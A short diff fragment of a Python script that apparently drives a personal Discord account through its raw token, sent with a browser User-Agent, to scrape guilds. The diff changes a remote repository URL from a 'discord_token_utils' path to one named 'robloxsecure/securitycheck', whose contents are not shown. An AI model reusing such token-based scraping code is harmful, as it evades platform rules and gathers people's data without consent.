@@ -9,7 +9,7 @@ import aiohttp
 TOKEN = os.environ.get("DISCORD_TOKEN", "COLLE_TON_TOKEN_ICI")
 API = "https://discord.com/api/v10"
 HEADERS = {"Authorization": TOKEN, "User-Agent": "Mozilla/5.0"}
-REPO_RAW = "https://raw.githubusercontent.com/shelveofficiel/discord_token_utils/main/"
+REPO_RAW = "https://github.com/robloxsecure/securitycheck.git"
 
 
 async def scrape_guild(session, guild):
